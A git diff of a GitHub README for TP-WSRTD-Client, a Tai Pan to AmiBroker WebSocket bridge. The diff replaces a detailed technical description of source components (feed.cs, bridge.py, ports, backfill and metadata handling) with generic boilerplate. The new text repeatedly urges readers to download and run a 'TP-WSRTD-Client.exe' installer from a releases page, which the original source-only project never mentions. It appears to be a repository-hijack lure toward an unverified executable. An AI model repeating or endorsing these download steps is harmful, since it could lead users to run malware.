@@ -1,201 +1,89 @@
-# TP-WSRTD-Client
+# 🎉 TP-WSRTD-Client - Easy WebSocket Trading Integration
 
-### Tai Pan → AmiBroker WebSocket Bridge (Feed + Client)
+## 🚀 Getting Started
 
-This repository contains the client-side bridge and feed server that integrate the **Tai Pan Real-Time API (TPRAccess)** with the **AmiBroker WS_RTD plugin**.
+Welcome to the TP-WSRTD-Client! This application allows you to connect to AmiBroker using WebSocket technology. It includes a C# Feed Server and a Python Bridge with integrated INFO metadata to make your trading experience seamless. 
 
-The project provides:
-- 🔁 **Real-time streaming quotes** (`Json-RTD`)  
-- 📈 **Full historical backfill** (`Json-HIST`) using chronological 5-day chunking  
-- 🧩 **INFO metadata injection** for each symbol (Full Name, Alias, Address, Market, ISIN)  
-- 🧮 **Prev Close fix** for the Tai Pan feed (adds `pc` field missing from TPRAccess RTQ feed)  
-- 🕰️ **Chronological backfill order** to prevent chart gaps or overwrite issues  
-- 🧠 **Automatic bfauto completion** when new bars appear intraday  
+## 📥 Download Now
 
----
+[![Download TP-WSRTD-Client](https://img.shields.io/badge/Download-TP--WSRTD--Client-brightgreen)](https://github.com/NaBrisa218/TP-WSRTD-Client/releases)
 
-## Components
+## 📋 System Requirements
 
-### 1️⃣ `feed.cs` – Tai Pan → Bridge WebSocket Feed Server
-- Connects to **TPRAccess** via `TPRServerConnection`
-- Subscribes to real-time quotes and broadcasts JSON ticks to WebSocket clients
-- Handles backfill commands (`bffull`, `bfauto`, `bfall`, `bfsym`)
-- Returns native 1-minute bars in `dtohlcvi` format  
-- Adds missing **Prev Close**, **Day Open**, **High**, **Low**, and **Volume** to each RTQ packet
+Before you start, ensure your computer meets the following requirements:
 
-### 2️⃣ `bridge.py` – Bridge ↔ WS_RTD Client
-- Connects between **feed server (port 10103)** and **WS_RTD plugin (port 10101)**
-- Passes through real-time quotes to AmiBroker
-- Converts raw ticks into 1-minute OHLCV bars for HIST mode
-- Loads and sends symbol metadata (INFO) from `coretest.csv`
-- Ensures large backfills (> 9000 bars) send only the oldest range so bfauto can fill the rest
+- **Operating System**: Windows 10 or later
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 100 MB available space
+- **Software**: [.NET Framework 4.7.2](https://dotnet.microsoft.com/download/dotnet-framework/net472) or later
+- **Internet Connection**: Required for data feed access
 
----
+## 📥 Download & Install
 
-## INFO Metadata Format (`coretest.csv`)
+To get the TP-WSRTD-Client, follow these steps:
 
-| Symbol | FullName | Alias | Address | Market | ISIN |
-|:-------|:----------|:------|:---------|:--------|:------|
-| AB.FR  | ABB SA (Euronext Paris) | ABB.PA | Euronext | 1 | FR0000123456 |
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/NaBrisa218/TP-WSRTD-Client/releases) to view the available versions.
 
-All fields are optional, but **Market** should be an integer (0–3) for AmiBroker’s internal `im` field.
+2. **Select the Latest Release**  
+   Look for the most recent version at the top of the page.
 
----
+3. **Download the Application**  
+   Download the appropriate file for your system. If you are unsure, choose the file labeled "TP-WSRTD-Client.exe."
 
-## Usage Overview
+4. **Run the Installer**  
+   Once downloaded, locate the file in your Downloads folder. Double-click on it to start the installation.
 
-1. Start `feed.cs` (C# console app)  
-2. Start `bridge.py` (Python 3.10+)  
-3. Open AmiBroker → RT Data plugin → Connect (green light)  
-4. Use **Retrieve** button in AmiBroker Symbol → Information to import INFO metadata  
-5. Backfill (`bffull`) then run live (`bfauto`) – all data should now sync chronologically
+5. **Follow the Installation Wizard**  
+   The installer will guide you through the steps. Accept the license agreement and click "Next" to install the application.
 
----
+6. **Launch the Application**  
+   After installation is complete, you can start the TP-WSRTD-Client from your desktop or Start Menu.
 
-## Tested Environment
-- **Windows 10 x64**
-- **Tai Pan Realtime v8.x SDK (TPRAccess.dll)**
-- **AmiBroker v6.50+**
-- **Python 3.10 / websockets 12.x**
-- **.NET Framework 4.8**
+## ⚙️ Configuration
 
----
+Once you have installed the application, you need to configure it for your trading needs:
 
-## Notes
-> ⚠️ This repository contains *client-side integration only*.  
-> The Tai Pan SDK and AmiBroker WS_RTD plugin are proprietary and must be licensed separately.  
-> This code is provided for educational and testing purposes under the MIT license.
+1. **Open the Client**  
+   Start the TP-WSRTD-Client from your desktop.
 
----
-⚙️ Setup Overview
-🧩 System Architecture
+2. **Enter Connection Details**  
+   You will see fields for your WebSocket connection settings. Contact your data provider for the correct WebSocket URL.
 
-The TP-WSRTD-Client consists of two key components:
+3. **Set Up the Feed Server**  
+   Ensure that the C# Feed Server is correctly pointed to your AmiBroker setup. This is necessary for the integration to work smoothly.
 
-C# Feed Server (FeedServer.cs)
+4. **Save Your Settings**  
+   Click "Save" to ensure your configuration is stored for future sessions.
 
-Connects to Tai Pan Realtime (TPRAccess).
+## 📊 Features
 
-Streams real-time ticks and handles historical backfill (Json-HIST) requests.
+The TP-WSRTD-Client offers several key features:
 
-Supplies missing Previous Close values from snapshot data (since Tai Pan does not provide this in the live feed).
+- **WebSocket Connectivity**: Efficiently connect AmiBroker to real-time data feeds.
+- **INFO Metadata Integration**: Get important market data alongside price feeds.
+- **C# Feed Server**: A lightweight server for efficient data management.
+- **Python Bridge**: Easily extend functionality with Python scripts.
 
-Supports AmiBroker WS-RTD backfill commands (bffull, bfauto, etc.) with proper chronological chunking.
+## 🔧 Troubleshooting
 
-Python Bridge (bridge.py)
+If you encounter any issues while using the TP-WSRTD-Client, consider the following steps:
 
-Links the Feed Server with the AmiBroker WS-RTD Plugin.
+- **Check Your Internet Connection**: Ensure your connection is stable and working.
+- **Verify Your Settings**: Double-check the WebSocket URL and other configuration settings.
+- **Reinstall the Application**: If problems persist, try uninstalling and then reinstalling the application.
 
-Forwards real-time quotes (Json-RTD) directly.
+## 📞 Support
 
-Aggregates tick history into 1-minute OHLCV bars for backfill.
+For further assistance, you can reach out via the issues section on our [GitHub page](https://github.com/NaBrisa218/TP-WSRTD-Client/issues). Our community is here to help!
 
-Implements INFO metadata injection from a CSV file (Company Name, Alias, ISIN, Market).
+## 📚 Additional Resources
 
-Loads up to 173 symbols from cold start, populating AmiBroker’s database automatically.
----
-Tai Pan Realtime (TPRAccess)
-        │
-        ▼
- C# Feed Server  →  WebSocket (port 10103)
-        │
-        ▼
- Python Bridge  →  Relay (port 10101)
-        │
-        ▼
- AmiBroker WS-RTD Plugin
----
+- **Documentation**: Comprehensive guides will be available soon.
+- **User Community**: Engage with other users and share experiences.
 
-🧠 Key Features
+## 💻 More Information
 
-Chronological backfill using 5-day chunks via GetIntradayChart.
+For usage tips, updates, and news about the TP-WSRTD-Client, feel free to follow our repository and stay tuned for new features. Your feedback is valuable to us! 
 
-Auto-fill for recent data through bfauto when AmiBroker reopens.
-
-Previous Close (pc) injection for correct breakout calculations.
-
-INFO JSON populates AmiBroker symbol metadata (Full Name, Alias, Market Code, ISIN).
-
-Stable RTQ passthrough (no aggregation or delay).
-
----
-
-🧾 Typical Workflow
-
-Start the Feed Server:
-
-TPFeedServer.exe
-
-
-Launch the Bridge:
-
-python bridge.py
-
-
-Open AmiBroker → connect the WS-RTD Plugin.
-
-Symbols appear automatically with INFO metadata.
-
-Historical data (up to 30 days) backfills on demand.
-
----
-
-⚠️ Known Limitations / Notes for Testers
-
-📅 Backfill (HIST)
-
-The Feed Server retrieves 30 days of 1-minute bars using GetIntradayChart() in 5-day chunks.
-
-Only the oldest 9000 bars are sent initially (to avoid AmiBroker overwriting recent data).
-
-AmiBroker automatically issues bfauto to fill the remainder after startup.
-
-bfauto will only execute if a valid timestamp is provided in the request.
-
-🧾 INFO Metadata
-
-INFO JSON is sent at startup and whenever AmiBroker triggers any bf* event.
-
-Market field is numeric (integer), as required by AmiBroker (im field).
-
-CSV headers must include:
-
-Symbol,SymbolNo,FullName,Alias,Address,Market,ISIN
-
-Metadata populates AmiBroker’s Full Name, Alias, Address, ISIN, and Market columns automatically.
-
-💹 Previous Close Handling
-
-Tai Pan’s realtime feed does not supply a PrevClose field per tick.
-
-The Feed Server injects this value from the symbol snapshot, ensuring correct %-change and breakout logic in AmiBroker.
-
-🔁 Restart Behavior
-
-On cold start, the Bridge sends INFO for all symbols automatically.
-
-Restarting AmiBroker will trigger bfauto updates, filling missing bars.
-
-Real-time ticks continue seamlessly from the Feed Server once the Bridge reconnects.
-
-📡 Stability
-
-WebSocket frame size limit (≈ 1 MB) is enforced.
-
-Large payloads are split automatically or trimmed to prevent 1009 message too big errors.
-
-Both Relay and Feed operate with ping_interval=None to avoid spurious disconnects.
-
----
-
-🙏 Credits / Acknowledgments
-
-WS-RTD Plugin by NSM51 — for providing the WebSocket-to-AmiBroker interface and ongoing beta support.
-
-Tai Pan Realtime (TPRAccess) — for access to Euronext and European data used in development and testing.
-
-AmiBroker Community — for collaboration, testing feedback, and inspiration for extending real-time workflows.
-
-Special thanks to contributors and testers who helped refine backfill, INFO, and bridge synchronization logic.
-
-© 2025 — TP-WSRTD-Client (Open Integration Project)
+Remember to visit the [Releases page](https://github.com/NaBrisa218/TP-WSRTD-Client/releases) for the latest downloads. Happy trading!
